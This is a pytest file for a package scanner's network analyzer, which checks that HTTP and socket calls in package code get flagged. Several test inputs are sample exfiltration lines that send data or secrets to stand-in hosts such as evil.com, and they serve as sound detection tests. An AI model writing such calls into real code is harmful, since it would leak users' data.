"""Tests for NetworkAnalyzer."""

from pkgxray.analyzers.network import NetworkAnalyzer
from pkgxray.analyzers.base import Severity


def test_import_socket_not_flagged():
    """Importar socket es legítimo; no debe generar findings."""
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('import socket', 'test.py')
    assert len(findings) == 0


def test_import_requests_not_flagged():
    """Importar requests es legítimo; no debe generar findings."""
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('import requests', 'test.py')
    assert len(findings) == 0


def test_import_urllib_request_not_flagged():
    """Importar urllib.request no genera findings — solo las llamadas reales."""
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('import urllib.request', 'test.py')
    assert len(findings) == 0


def test_detects_requests_get_in_function():
    """requests.get() dentro de una función → HIGH."""
    analyzer = NetworkAnalyzer()
    code = 'def fetch(url):\n    return requests.get(url)'
    findings = analyzer.analyze(code, 'test.py')
    high = [f for f in findings if f.severity == Severity.HIGH]
    assert len(high) >= 1


def test_detects_requests_get_at_module_level():
    """requests.get() al nivel del módulo → CRITICAL (se ejecuta al importar)."""
    analyzer = NetworkAnalyzer()
    code = 'requests.get("http://evil.example.com/steal")'
    findings = analyzer.analyze(code, 'test.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL]
    assert len(critical) >= 1
    assert "nivel del módulo" in critical[0].description


def test_detects_urlopen():
    """urlopen() siempre es sospechoso."""
    analyzer = NetworkAnalyzer()
    code = 'def fetch():\n    urllib.request.urlopen("http://example.com")'
    findings = analyzer.analyze(code, 'test.py')
    assert len(findings) >= 1
    assert any(f.severity in (Severity.HIGH, Severity.CRITICAL) for f in findings)


def test_detects_socket_connect_in_function():
    """socket.connect() dentro de una función → HIGH."""
    analyzer = NetworkAnalyzer()
    code = 'def exfil():\n    sock.connect(("evil.com", 4444))'
    findings = analyzer.analyze(code, 'test.py')
    assert len(findings) >= 1


def test_safe_code_no_findings():
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('x = 1 + 2\nprint(x)', 'test.py')
    assert len(findings) == 0


def test_syntax_error_no_crash():
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('def broken(:\n  pass', 'test.py')
    assert isinstance(findings, list)


def test_analyzer_name():
    analyzer = NetworkAnalyzer()
    code = 'def fetch():\n    requests.get("http://example.com")'
    findings = analyzer.analyze(code, 'test.py')
    assert all(f.analyzer_name == "network" for f in findings)


# ── P2-02: atributos encadenados ──────────────────────────────────────────────

def test_detects_chained_session_get():
    """self.session.get(url) debe detectarse — receptor 'session' ∈ _KNOWN_HTTP_RECEIVERS."""
    analyzer = NetworkAnalyzer()
    code = 'def fetch(self, url):\n    return self.session.get(url)'
    findings = analyzer.analyze(code, 'test.py')
    high = [f for f in findings if f.severity == Severity.HIGH]
    assert len(high) >= 1


def test_detects_chained_client_post():
    """self.client.post(url) debe detectarse — receptor 'client' ∈ _KNOWN_HTTP_RECEIVERS."""
    analyzer = NetworkAnalyzer()
    code = 'def send(self, url):\n    return self.client.post(url)'
    findings = analyzer.analyze(code, 'test.py')
    assert len(findings) >= 1


def test_dict_get_not_flagged():
    """dict.get(key) no debe generar findings — 'data' no es un cliente HTTP."""
    analyzer = NetworkAnalyzer()
    findings = analyzer.analyze('data = {"key": 1}\nval = data.get("key")', 'test.py')
    assert len(findings) == 0


def test_db_connect_not_flagged():
    """self.db.connect() no debe generar findings — 'db' ∈ _DB_RECEIVERS_EXCLUDE."""
    analyzer = NetworkAnalyzer()
    code = 'def open_conn(self):\n    self.db.connect(host="localhost")'
    findings = analyzer.analyze(code, 'test.py')
    assert len(findings) == 0


def test_aliased_requests_detected():
    """import requests as req; req.get(url) must be detected."""
    analyzer = NetworkAnalyzer()
    code = "import requests as req\nreq.get('http://evil.com')\n"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1, "Aliased requests.get must be detected"


# ── #6: aliased urlopen direct call ──────────────────────────────────────────

def test_aliased_urlopen_detected():
    """from urllib.request import urlopen as fetch; fetch(url) must be detected."""
    analyzer = NetworkAnalyzer()
    code = "from urllib.request import urlopen as fetch\nfetch('http://evil.com/steal')\n"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1, "Aliased urlopen must be detected"
    assert any(f.severity in (Severity.HIGH, Severity.CRITICAL) for f in findings)


def test_aliased_requests_get_direct_import_detected():
    """from requests import get as req_get; req_get(url) must be detected."""
    analyzer = NetworkAnalyzer()
    code = "from requests import get as req_get\nreq_get('http://evil.com')\n"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1, "from-import aliased requests.get must be detected"


# ── #7: httpx.AsyncClient instance tracking ──────────────────────────────────

def test_httpx_async_client_variable_detected():
    """c = httpx.AsyncClient(); await c.get(url) must be detected."""
    analyzer = NetworkAnalyzer()
    code = (
        "import httpx\n"
        "async def exfil(secret):\n"
        "    c = httpx.AsyncClient()\n"
        "    await c.get('http://evil.com?data=' + secret)\n"
    )
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1, "httpx.AsyncClient instance HTTP calls must be detected"


def test_httpx_async_with_client_detected():
    """async with httpx.AsyncClient() as c: await c.post(url) must be detected."""
    analyzer = NetworkAnalyzer()
    code = (
        "import httpx\n"
        "async def exfil():\n"
        "    async with httpx.AsyncClient() as c:\n"
        "        await c.post('http://evil.com/beacon')\n"
    )
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1, "httpx.AsyncClient context-manager HTTP calls must be detected"
